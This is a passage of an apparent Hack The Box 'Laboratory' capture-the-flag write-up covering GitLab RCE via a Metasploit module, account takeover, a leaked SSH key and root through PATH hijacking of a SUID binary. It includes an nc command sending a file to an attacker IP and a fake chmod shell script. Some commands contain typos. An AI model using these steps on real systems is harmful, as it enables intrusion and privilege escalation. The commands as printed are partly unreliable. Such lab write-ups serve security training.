                Initial reconnaissance with <span>nmap</span> lists three open ports: SSH and HTTP/S. Opening
                <span>http://laboratory.htb</span> will immediately redirect to HTTPS and produce a certificate warning,
                which we accept.
            </p>

            <p>
                The basic page is of some company named "The Laboratory" which only hints that they do some kind of
                development and that a blog may be coming soon.</p>

            <p>
                There's no moving parts in here so we need to look a little more carefully.
                The SSL certificate has a revealing entry, relating to the software development hint. There's a
                <span>git.laboratory.htb</span> subdomain which we add to our hosts with <span>echo "10.10.10.216
                    git.laboratory.htb" | sudo tee --append /etc/hosts</span>. In here we find a Gitlab instance.
            </p>

            <p>
                Trying to create a user will work, but the server only accepts <span>*@laboratory.htb</span> addresses.
                After
                creating the account, let's have a look inside.</p>
            </p>

            <p>
                Inside there is one public project, the Laboratory home page, by a user Dexter McPherson whose username
                here is <span>dexter</span>.
                The <span>/help</span> page gives up the version number of this instance,
                <span>12.8.1</span> which very quickly proves to be <a
                    href="https://www.rapid7.com/db/modules/exploit/multi/http/gitlab_file_read_rce/">vulnerable to
                    RCE</a> and has a Metasploit module
                available
                at <span>multi/http/gitlab_file_read_rce</span>. Using the module does spawn a shell with user
                <span>git</span> at
                <span>/var/opt/gitlab/gitlab-rails/working</span>.
            </p>

        </section>
        <section id="user">
            <h2>3. User</h2>
            <p>
                The filesystem root has a
                <span>.dockerenv</span> file which points to this shell being inside a Docker container.
                In that case it should have some default Gitlab utils such as the
                development console installed.
            </p>

            <code>git@git:~/gitlab-rails$ which gitlab-rails
/opt/gitlab/bin/gitlab-rails</code>

            <p>
                The console is available. Let's fire it up and try editing the database with ActiveRecord so we may log
                in as
                Dexter to
                see if there's something still hidden within Gitlab. Note that the command takes a while to load.
            </p>

            <p>
                Now that <span>dexter</span>'s password has been changed, let's log in to Gitlab with their credentials.
            </p>

            <p>
                We now find a new repository <span>SecureDocker</span>. The
                repository has a directory structure <span>securedocker/dexter/.ssh</span>, which contains an SSH key.
                Downloading it to the attacker as <span>dexter.key</span> we can try to use it to SSH into the machine
                with
                <span>ssh -i dexter.key dexter@laboratory.htb</span>.
            </p>

            <img src="static/img/laboratory_2.jpg" />
            <figcaption>Dexter left an SSH key lying around</figcaption>

            <p>
                SSH is successful and we may now get the user key.
            </p>

            <section id="root">
                <h2>4. Root</h2>

                <p>
                    Let's look if we can find any SUID binaries lying around with <span>find / -type f -4000
                        2>/devn/null</span>.
                </p>

                <p>
                    Looking at the output there is a non-standard SUID file <span>/usr/local/bin/docker-security</span>
                    that
                    can
                    be executed.
                </p>

                <code>dexter@laboratory:/usr/local/bin$ file docker-security
docker-security: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d466f1fb0f54c0274e5d05974e81f19dc1e76602, for GNU/Linux 3.2.0, not stripped</code>

                <p>
                    It seems that it's a binary executable. Online searching for this binary yields little results so we
                    exfiltrate it to the attacker machine for further
                    analysis.
                </p>

                <p>
                    Open up a listener on the attacker with <span>nc -lvnp 4445 > docker-security.b64</span> and send it
                    from the target with <span>cat docker-security | base64 | nc 10.10.14.74 4444</span>. Then decode it
                    with <span>base64 -d docker-security.b64 > docker-security</span>.
                </p>

                <p>First let's look at <span>strings</span> if we can find something about the program.</p>

                <code>...

                <figcaption>Output sample of <span>strings docker-security</span></figcaption>

                <p>
                    It seems that the binary may be using <span>chmod</span> to manipulate permissions on a Docker
                    socket
                    for
                    example. It doesn't seem to have an absolute path for the binary in these strings, which may make it
                    vulnerable to path
                    hijacking.
                </p>

                <p>We can try this by creating a humorous <span>chmod</span>:</p>

                <code>dexter@laboratory:~$ echo '#!/bin/bash' >> chmod
dexter@laboratory:~$ echo '/bin/bash' >> chmod
dexter@laboratory:~$ which chmod
/usr/bin/chmod
dexter@laboratory:~$ /usr/bin/chmod +x chmod</code>

                <p>
                    Now, we execute the <span>docker-security</span> with a prepended <span>PATH</span> in the
                    environment so that
                    <span>chmod</span> is found at <span>/home/dexter/chmod</span>:
                </p>

                <code>dexter@laboratory:~$ PATH=/home/dexter:$PATH /usr/local/bin/docker-security
root@laboratory:~# id;hostname
uid=0(root) gid=0(root) groups=0(root),1000(dexter)
laboratory</code>

                <p>Grab the root flag and we are done.</p>
